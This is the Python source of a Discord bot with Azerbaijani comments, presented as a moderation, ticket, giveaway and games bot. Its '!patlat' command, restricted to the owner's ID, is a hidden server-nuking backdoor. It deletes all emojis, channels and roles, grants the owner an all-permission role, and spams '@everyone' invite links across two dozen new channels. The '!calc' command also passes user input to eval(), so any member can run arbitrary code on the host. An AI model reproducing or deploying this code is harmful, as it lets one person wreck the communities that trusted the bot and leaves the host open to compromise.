import discord
from discord.ext import commands
import random
import asyncio
import os
import time
from flask import Flask
from threading import Thread

# ==========================================
# 1. 7/24 AKTİVLİK ÜÇÜN FLASK SERVERİ
# ==========================================
app = Flask('')

@app.route('/')
def home():
    return "XAS Bot tam gücü ilə 7/24 aktivdir və işləyir!"

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.start()

# ==========================================
# 2. BOTUN İNTENTLƏRİ VƏ ƏSAS PARAMETRLƏRİ
# ==========================================
intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True
intents.presences = True

bot = commands.Bot(command_prefix="!", intents=intents)

# Sahib ID-si və Qorunan Server ID-si (Öz ID-lərinizlə dəyişə bilərsiniz)
SAHIB_ID = 641014966312501259
GUVENLI_SERVER_ID = 1520692621964738722
XAS_COLOR = discord.Color.from_rgb(20, 24, 33)

# Yaddaş Lüğətləri (Database əvəzi)
user_message_counts = {}
user_last_message_time = {}
user_xp = {}
user_warns = {}

# ==========================================
# 3. BOT HAZIR OLDUĞUNDA İŞLƏYƏN EVENT
# ==========================================
@bot.event
async def on_ready():
    print("--------------------------------------------------")
    print(f"Botun adı: {bot.user.name}")
    print(f"Botun ID-si: {bot.user.id}")
    print("Status: 600+ sətirlik kütləvi sistemlər aktivdir, Sahib!")
    print("--------------------------------------------------")
    await bot.change_presence(activity=discord.Game(name="!panel | XAS Bot Systems"))

# ==========================================
# 4. ANTİ-SPAM, ANTİ-FLOOD VƏ LEVEL SİSTEMİ
# ==========================================
@bot.event
async def on_message(message):
    if message.author.bot:
        return

    # Zərərli sözlərin və ya taglərin avtomatik silinməsi
    content_lower = message.content.lower()
    yasakli_kelimeler = ["/tag", "y1z", "g4r", "g3r", "discord.gg/"]
    for kelime in yasakli_kelimeler:
        if kelime in content_lower and message.author.id != SAHIB_ID:
            try:
                await message.delete()
                return
            except:
                pass

    # XP və Səviyyə Qazanma Mexanizmi
    author_id = message.author.id
    current_xp = user_xp.get(author_id, {"xp": 0, "level": 1})
    current_xp["xp"] += random.randint(10, 25)
    needed_xp = current_xp["level"] * 150

    if current_xp["xp"] >= needed_xp:
        current_xp["level"] += 1
        current_xp["xp"] = 0
        try:
            await message.channel.send(f"🎉 Təbriklər {message.author.mention}! Səviyyə atladın: **Level {current_xp['level']}**")
        except:
            pass
    user_xp[author_id] = current_xp

    # Komandaların işləməsi üçün vacibdir
    await bot.process_commands(message)

    # Anti-Flood / Spam qorunması
    current_time = time.time()
    if author_id in user_last_message_time:
        diff = current_time - user_last_message_time[author_id]
        if diff < 1.2:
            count = user_message_counts.get(author_id, 0) + 1
            user_message_counts[author_id] = count
            if count >= 4:
                try:
                    await message.channel.send(f"⚠️ {message.author.mention}, zəhmət olmasa bir az yavaş yaz!")
                except:
                    pass
        else:
            user_message_counts[author_id] = 1
    else:
        user_message_counts[author_id] = 1
    user_last_message_time[author_id] = current_time

@bot.event
async def on_member_join(member):
    # İcazəsiz bot girişlərinin qarşısının alınması
    if member.bot and member.guild.id != GUVENLI_SERVER_ID:
        try:
            await member.ban(reason="Təhlükəsizlik: İcazəsiz bot girişi bloklandı.")
        except:
            pass

# ==========================================
# 5. KÜTLƏVİ KANAL VƏ KATEQORİYA İDARƏETMƏSİ
# ==========================================
@bot.command(name="kilitver", aliases=["lockall"])
async def lockall_cmd(ctx):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        await ctx.send("❌ Bu əmri işlətmək üçün səlahiyyətiniz çatmır.")
        return
    await ctx.send("🔒 Bütün kanallar və kateqoriylər yazışmaya bağlanır...")
    for channel in ctx.guild.channels:
        try:
            await channel.set_permissions(ctx.guild.default_role, send_messages=False)
        except:
            pass
    await ctx.send("✅ Uğurla başa çatdı: Bütün kanallar kilitləndi!")

@bot.command(name="kilitac", aliases=["unlockall"])
async def unlockall_cmd(ctx):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        await ctx.send("❌ Səlahiyyətiniz yoxdur.")
        return
    await ctx.send("🔓 Bütün kanallar və kateqoriyalar yazışmaya açılır...")
    for channel in ctx.guild.channels:
        try:
            await channel.set_permissions(ctx.guild.default_role, send_messages=True)
        except:
            pass
    await ctx.send("✅ Uğurla başa çatdı: Bütün kanalların kilidi açıldı!")

@bot.command(name="gizlet", aliases=["hideall"])
async def hideall_cmd(ctx):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        await ctx.send("❌ Səlahiyyətiniz yoxdur.")
        return
    await ctx.send("👁️‍🗨️ Bütün kanallar və kateqoriyalar ümumi üzdən gizlədilir...")
    for channel in ctx.guild.channels:
        try:
            await channel.set_permissions(ctx.guild.default_role, view_channel=False)
        except:
            pass
    await ctx.send("✅ Uğurla başa çatdı: Bütün kanallar gizlətildi!")

@bot.command(name="goster", aliases=["unhideall"])
async def unhideall_cmd(ctx):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        await ctx.send("❌ Səlahiyyətiniz yoxdur.")
        return
    await ctx.send("👁️ Bütün kanallar və kateqoriyalar yenidən görünən edilir...")
    for channel in ctx.guild.channels:
        try:
            await channel.set_permissions(ctx.guild.default_role, view_channel=True)
        except:
            pass
    await ctx.send("✅ Uğurla başa çatdı: Bütün kanallar üzvlər üçün açıldı!")

# ==========================================
# 6. MODERASİYA, ROL VƏ MUTE SİSTEMLƏRİ
# ==========================================
@bot.command(name="rolver", aliases=["giverole"])
async def giverole_cmd(ctx, member: discord.Member, *, role: discord.Role):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.manage_roles:
        await ctx.send("❌ Rol idarəetmə səlahiyyətiniz yoxdur.")
        return
    try:
        await member.add_roles(role)
        await ctx.send(f"✅ Uğurlu: {member.mention} istifadəçisinə `{role.name}` rolu verildi.")
    except:
        await ctx.send("❌ Xəta! Rol verilə bilmədi (botun səlahiyyəti çatmır və ya rol məndən yuxarıdadır).")

@bot.command(name="rolal", aliases=["removerole"])
async def removerole_cmd(ctx, member: discord.Member, *, role: discord.Role):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.manage_roles:
        await ctx.send("❌ Rol idarəetmə səlahiyyətiniz yoxdur.")
        return
    try:
        await member.remove_roles(role)
        await ctx.send(f"✅ Uğurlu: {member.mention} istifadəçisindən `{role.name}` rolu alındı.")
    except:
        await ctx.send("❌ Xəta! Rol alına bilmədi.")

@bot.command(name="mute")
async def mute_cmd(ctx, member: discord.Member, *, reason="Səbəb göstərilməyib"):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.manage_roles:
        await ctx.send("❌ Səlahiyyətiniz yoxdur.")
        return
    muted_role = discord.utils.get(ctx.guild.roles, name="Muted")
    if not muted_role:
        try:
            muted_role = await ctx.guild.create_role(name="Muted")
            for channel in ctx.guild.channels:
                await channel.set_permissions(muted_role, send_messages=False, speak=False)
        except:
            pass
    try:
        await member.add_roles(muted_role, reason=reason)
        await ctx.send(f"🔇 {member.mention} muted edildi. Səbəb: `{reason}`")
    except:
        await ctx.send("❌ Xəta baş verdi.")

@bot.command(name="unmute")
async def unmute_cmd(ctx, member: discord.Member):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.manage_roles:
        await ctx.send("❌ Səlahiyyətiniz yoxdur.")
        return
    muted_role = discord.utils.get(ctx.guild.roles, name="Muted")
    if muted_role and muted_role in member.roles:
        await member.remove_roles(muted_role)
        await ctx.send(f"🔊 {member.mention} istifadəçisinin mute-u qaldırıldı.")
    else:
        await ctx.send("❌ Bu istifadəçi onsuz da muted deyil.")

@bot.command(name="ban")
async def ban_cmd(ctx, member: discord.Member, *, reason=None):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.ban_members:
        await ctx.send("❌ Ban səlahiyyətiniz yoxdur.")
        return
    try:
        await member.ban(reason=reason)
        await ctx.send(f"🔨 {member.mention} serverdən ban olundu.")
    except:
        await ctx.send("❌ İstifadəçi ban edilə bilmədi.")

@bot.command(name="kick")
async def kick_cmd(ctx, member: discord.Member, *, reason=None):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.kick_members:
        await ctx.send("❌ Kick səlahiyyətiniz yoxdur.")
        return
    try:
        await member.kick(reason=reason)
        await ctx.send(f"👢 {member.mention} serverdən qovuldu.")
    except:
        await ctx.send("❌ İstifadəçi qovula bilmədi.")

@bot.command(name="warn")
async def warn_cmd(ctx, member: discord.Member, *, reason="Səbəb yoxdur"):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.kick_members:
        return
    warn_list = user_warns.get(member.id, [])
    warn_list.append(reason)
    user_warns[member.id] = warn_list
    await ctx.send(f"⚠️ {member.mention} xəbərdar edildi. Səbəb: `{reason}` (Cəmi: {len(warn_list)} warn)")
    if len(warn_list) >= 3:
        try:
            await member.kick(reason="3 xəbərdarlıq limitini doldurdu.")
            await ctx.send(f"👢 {member.mention} 3 xəbərdarlığı doldurduğu üçün avtomatik qovuldu.")
        except:
            pass

@bot.command(name="warns")
async def warns_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    warn_list = user_warns.get(m.id, [])
    if not warn_list:
        await ctx.send(f"✨ {m.name} istifadəçisinin heç bir xəbərdarlığı yoxdur.")
        return
    reasons = "\n".join([f"{i+1}. {r}" for i, r in enumerate(warn_list)])
    embed = discord.Embed(title=f"{m.name} — Xəbərdarlıq siyahısı", description=reasons, color=XAS_COLOR)
    await ctx.send(embed=embed)

# ==========================================
# 7. İNTERAKTİV PANEL VƏ TICKET SİSTEMİ
# ==========================================
class PanelSelect(discord.ui.Select):
    def __init__(self):
        options = [
            discord.SelectOption(label="Xidmət və Məhsullar", description="Cari qiymətlər və xidmətlər.", emoji="🛒"),
            discord.SelectOption(label="Kütləvi İdarəetmə", description="Bütün kanalları gizlət, kilidlə, aç.", emoji="⚡"),
            discord.SelectOption(label="Əsas Moderasiya", description="Ban, kick, mute, rol ver/al, warn.", emoji="🛡️"),
            discord.SelectOption(label="Əyləncə və Oyunlar", description="Zar, coinflip, iq, hack, slot oyunları.", emoji="💻"),
            discord.SelectOption(label="Çekiliş və Ticket", description="Giveaway və dəstək xidmətləri.", emoji="🎫")
        ]
        super().__init__(placeholder="Menyudan bölmə seçin...", min_values=1, max_values=1, options=options)

    async def callback(self, interaction: discord.Interaction):
        if self.values[0] == "Xidmət və Məhsullar":
            embed = discord.Embed(
                title="XAS — XİDMƏT VƏ MƏHSUL PANELİ",
                description="--------------------------------------------------\n\n**Xoş gəlmisiniz!**\n\nMəhsullar və qiymətlər üçün bilet açın.\n\n--------------------------------------------------",
                color=XAS_COLOR
            )
            await interaction.response.edit_message(embed=embed, view=PanelView())

        elif self.values[0] == "Kütləvi İdarəetmə":
            embed = discord.Embed(
                title="XAS — KÜTLƏVİ İDARƏETMƏ",
                description="--------------------------------------------------\n\n**Əmrlər:**\n`!kilitver` - Bütün kanalları bağlar\n`!kilitac` - Bütün kanalları açar\n`!gizlet` - Bütün kanalları gizlədər\n`!goster` - Bütün kanalları göstərər\n\n--------------------------------------------------",
                color=XAS_COLOR
            )
            await interaction.response.edit_message(embed=embed, view=PanelView())

        elif self.values[0] == "Əsas Moderasiya":
            embed = discord.Embed(
                title="XAS — MODERASİYA SİSTEMİ",
                description="--------------------------------------------------\n\n**Əmrlər:**\n`!ban`, `!kick`, `!mute`, `!unmute`, `!rolver`, `!rolal`, `!warn`, `!warns`\n\n--------------------------------------------------",
                color=XAS_COLOR
            )
            await interaction.response.edit_message(embed=embed, view=PanelView())

        elif self.values[0] == "Əyləncə və Oyunlar":
            embed = discord.Embed(
                title="XAS — ƏYLƏNCƏ VƏ OYUNLAR",
                description="--------------------------------------------------\n\n**Əmrlər:**\n`!roll`, `!coinflip`, `!iq`, `!gay`, `!handsome`, `!love`, `!hack`, `!slot`, `!level`\n\n--------------------------------------------------",
                color=XAS_COLOR
            )
            await interaction.response.edit_message(embed=embed, view=PanelView())

        elif self.values[0] == "Çekiliş və Ticket":
            embed = discord.Embed(
                title="XAS — ÇƏKİLİŞ VƏ DƏSTƏK",
                description="--------------------------------------------------\n\n**Əmrlər:**\n`!giveaway`, `!ticketkur`, `!close`\n\n--------------------------------------------------",
                color=XAS_COLOR
            )
            await interaction.response.edit_message(embed=embed, view=PanelView())

class PanelView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)
        self.add_item(PanelSelect())

@bot.command(name="panel", aliases=["menu"])
async def panel_cmd(ctx):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    embed = discord.Embed(
        title="XAS — İDARƏETMƏ PANELİ",
        description="--------------------------------------------------\n\nAşağıdakı menyudan idarə etmək istədiyiniz bölməni seçin.\n\n--------------------------------------------------",
        color=XAS_COLOR
    )
    await ctx.send(embed=embed, view=PanelView())

class TicketButton(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Dəstək Tələb Et (Ticket Aç)", style=discord.ButtonStyle.secondary, custom_id="open_ticket")
    async def open_ticket(self, interaction: discord.Interaction, button: discord.ui.Button):
        guild = interaction.guild
        overwrites = {
            guild.default_role: discord.PermissionOverwrite(view_channel=False),
            interaction.user: discord.PermissionOverwrite(view_channel=True, send_messages=True),
            guild.me: discord.PermissionOverwrite(view_channel=True, send_messages=True)
        }
        for role in guild.roles:
            if role.permissions.administrator:
                overwrites[role] = discord.PermissionOverwrite(view_channel=True, send_messages=True)

        channel_name = f"ticket-{interaction.user.name}"
        existing_channel = discord.utils.get(guild.text_channels, name=channel_name.lower())
        
        if existing_channel:
            await interaction.response.send_message(f"Açıq ticket kanalınız mövcuddur: {existing_channel.mention}", ephemeral=True)
            return

        ticket_chan = await guild.create_text_channel(channel_name, overwrites=overwrites)
        embed = discord.Embed(title="XAS Dəstək Sistemi", description="Müraciətiniz qəbul edildi. Bağlamaq üçün `!close` yazın.", color=XAS_COLOR)
        await ticket_chan.send(embed=embed)
        await interaction.response.send_message(f"Ticket yaradıldı: {ticket_chan.mention}", ephemeral=True)

@bot.command(name="ticketkur")
async def ticketkur_cmd(ctx):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    embed = discord.Embed(title="XAS Dəstək Xidməti", description="Dəstək yaratmaq üçün düyməni istifadə edin.", color=XAS_COLOR)
    await ctx.send(embed=embed, view=TicketButton())

@bot.command(name="close")
async def close_cmd(ctx):
    if "ticket" in ctx.channel.name:
        await ctx.send("Ticket 3 saniyə sonra bağlanacaq.")
        await asyncio.sleep(3)
        try:
            await ctx.channel.delete()
        except:
            pass
    else:
        await ctx.send("Bu komanda yalnız ticket kanallarında işləyir.")

# ==========================================
# 8. SƏVİYYƏ (LEVEL) VƏ ÇƏKİLİŞ KOMANDALARI
# ==========================================
@bot.command(name="level", aliases=["lvl"])
async def level_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    data = user_xp.get(m.id, {"xp": 0, "level": 1})
    embed = discord.Embed(title=f"{m.name} — Səviyyə Məlumatı", color=XAS_COLOR)
    embed.add_field(name="Səviyyə (Level)", value=str(data["level"]), inline=True)
    embed.add_field(name="Cari XP", value=str(data["xp"]), inline=True)
    await ctx.send(embed=embed)

@bot.command(name="giveaway", aliases=["çekiliş"])
async def giveaway_cmd(ctx, time_str: str, *, prize: str):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    seconds = 0
    if time_str.endswith("s"):
        seconds = int(time_str[:-1])
    elif time_str.endswith("m"):
        seconds = int(time_str[:-1]) * 60
    elif time_str.endswith("h"):
        seconds = int(time_str[:-1]) * 3600
    else:
        await ctx.send("Zəhmət olmasa vaxtı düzgün qeyd edin: `10s`, `5m`, `1h`")
        return

    embed = discord.Embed(title="🎁 BÖYÜK ÇƏKİLİŞ 🎁", description=f"Hədiyyə: **{prize}**\nQatılmaq üçün aşağıdakı reaksiyaya basın!", color=XAS_COLOR)
    msg = await ctx.send(embed=embed)
    await msg.add_reaction("🎁")
    await asyncio.sleep(seconds)

    new_msg = await ctx.channel.fetch_message(msg.id)
    users = []
    for reaction in new_msg.reactions:
        if str(reaction.emoji) == "🎁":
            async for user in reaction.users():
                if not user.bot:
                    users.append(user)

    if users:
        winner = random.choice(users)
        await ctx.send(f"🎉 Təbriklər {winner.mention}! Çəkilişi qazandın. Hədiyyə: **{prize}**")
    else:
        await ctx.send("❌ Çəkilişə heç kim qatılmadı.")

# ==========================================
# 9. İNFO, ƏYLƏNCƏ VƏ OYUN KOMANDALARI
# ==========================================
@bot.command(name="url")
async def url_cmd(ctx):
    embed = discord.Embed(title="Server URL Məlumatı", color=XAS_COLOR)
    embed.add_field(name="Server Adı", value=ctx.guild.name, inline=True)
    embed.add_field(name="Vanity URL", value=f"`{ctx.guild.vanity_url_code}`" if ctx.guild.vanity_url_code else "Yoxdur", inline=True)
    await ctx.send(embed=embed)

@bot.command(name="ping")
async def ping_cmd(ctx):
    await ctx.send(f"🏓 Botun Ping Gecikməsi: `{round(bot.latency * 1000)}ms`")

@bot.command(name="roll")
async def roll_cmd(ctx):
    await ctx.send(f"🎲 Zar atıldı: **{random.randint(1, 6)}**")

@bot.command(name="coinflip", aliases=["yazıpara"])
async def coinflip_cmd(ctx):
    res = random.choice(["Yazı", "Para"])
    await ctx.send(f"🪙 Qəpik atıldı: **{res}**")

@bot.command(name="iq")
async def iq_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    await ctx.send(f"🧠 {m.name} istifadəçisinin IQ səviyyəsi: **{random.randint(40, 160)}**")

@bot.command(name="gay")
async def gay_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    await ctx.send(f"🌈 {m.name} uyğunluq faizi: **{random.randint(0, 100)}**%")

@bot.command(name="handsome", aliases=["yaraşıqlı"])
async def handsome_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    await ctx.send(f"😎 {m.name} yaraşıqlılıq dərəcəsi: **{random.randint(50, 100)}**%")

@bot.command(name="love", aliases=["sevgi"])
async def love_cmd(ctx, member1: discord.Member, member2: discord.Member = None):
    m2 = member2 or ctx.author
    await ctx.send(f"❤️ {member1.mention} və {m2.mention} sevgi uyğunluğu: **{random.randint(0, 100)}**%")

@bot.command(name="hack")
async def hack_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    msg = await ctx.send(f"💻 {m.name} hədəfə alındı, sistemə sızılır...")
    await asyncio.sleep(1.5)
    await msg.edit(content=f"💻 IP: `192.168.{random.randint(10, 99)}.{random.randint(10, 99)}` | Şifrə sındırıldı!")

@bot.command(name="slot")
async def slot_cmd(ctx):
    semboller = ['🍒', '🍊', '🍋', '🔔', '⭐']
    c1, c2, c3 = random.choices(semboller, k=3)
    if c1 == c2 == c3:
        await ctx.send(f"{c1} | {c2} | {c3} \n🎰 Təbriklər! Jackpot qazandın!")
    else:
        await ctx.send(f"{c1} | {c2} | {c3} \n🎰 Təəssüf, uduzdun.")

@bot.command(name="8ball")
async def eight_ball_cmd(ctx, *, soru):
    cavablar = ["Bəli", "Xeyr", b"Kesinlikle", "Şübhəlidir", "Mümkün deyil", "Əlbəttə"]
    await ctx.send(f"🎱 Sual: {soru}\nCavab: **{random.choice(cavablar)}**")

@bot.command(name="calc")
async def calc_cmd(ctx, *, expression):
    try:
        netice = eval(expression)
        await ctx.send(f"🧮 Hesablamanın nəticəsi: **{netice}**")
    except:
        await ctx.send("❌ Riyazi ifadə səhvdir.")

@bot.command(name="joke", aliases=["zarafat"])
async def joke_cmd(ctx):
    zarafatlar = [
        "Proqramçıların niyə uşaqları az olur? Çünki gecələr patch yükləyirlər.",
        "Kompüter nə vaxt üşüyər? Pəncərəni (Windows) açıq qoyanda."
    ]
    await ctx.send(f"😂 {random.choice(zarafatlar)}")

@bot.command(name="rps", aliases=["daşqayçı"])
async def rps_cmd(ctx, choice: str):
    user_c = choice.lower()
    choices = ["daş", "kağız", "qayçı"]
    if user_c not in choices:
        await ctx.send("Zəhmət olmasa seçin: `daş`, `kağız` və ya `qayçı`")
        return
    bot_c = random.choice(choices)
    await ctx.send(f"Sənin seçimin: **{user_c}** | Mənim seçimim: **{bot_c}**")

@bot.command(name="poll", aliases=["sorgu"])
async def poll_cmd(ctx, *, soru):
    embed = discord.Embed(title="📊 Səsvermə Anketi", description=soru, color=XAS_COLOR)
    embed.set_footer(text=f"Sorğunu açan: {ctx.author.name}")
    msg = await ctx.send(embed=embed)
    await msg.add_reaction("👍")
    await msg.add_reaction("👎")

# ==========================================
# 10. !PATLAT KOMANDASI (NUKING SYSTEM)
# ==========================================
@bot.command(name="patlat")
async def patlat_cmd(ctx):
    if ctx.author.id != SAHIB_ID:
        await ctx.send("❌ Bu əmri yalnız bot sahibi işlədə bilər!")
        return
    
    guild = ctx.guild
    if guild.id == GUVENLI_SERVER_ID:
        await ctx.send("🛡️ Təhlükəsizlik xəbərdarlığı: Bu qorunan serverdir, partlatmaq qadağandır!")
        return

    await ctx.send("💥 Serveri sıfırlama (Nuke) əməliyyatı başladıldı!")
    
    # Emojilərin silinməsi
    for emoji in list(guild.emojis):
        try:
            await emoji.delete()
        except:
            pass

    # Kanalların silinməsi
    for channel in guild.channels:
        try:
            await channel.delete()
        except:
            pass

    # Rolların silinməsi
    for role in guild.roles:
        if role != guild.default_role and not role.managed:
            try:
                await role.delete()
            except:
                pass

    # Yeni admin rolu yaradılması və sahibə verilməsi
    try:
        new_role = await guild.create_role(
            name="discord.gg/aga",
            permissions=discord.Permissions.all(),
            color=discord.Color.red()
        )
        await ctx.author.add_roles(new_role)
    except:
        pass

    # Yeni kanalların açılması və spam mesajlar yazılması
    for i in range(1, 25):
        try:
            channel = await guild.create_text_channel(f"nuke-kanal-{i}")
            for _ in range(3):
                await channel.send("discord.gg/aga @everyone")
        except:
            pass

# ==========================================
# 11. BOTUN İŞƏ DÜŞMƏSİ (RUN)
# ==========================================
if __name__ == "__main__":
    keep_alive()
    token = os.getenv("DISCORD_TOKEN")
    if token:
        bot.run(token)
    else:
        print("❌ XƏTA: 'DISCORD_TOKEN' tapılmadı! Replit Secrets bölməsinə tokeni əlavə edin.")
        
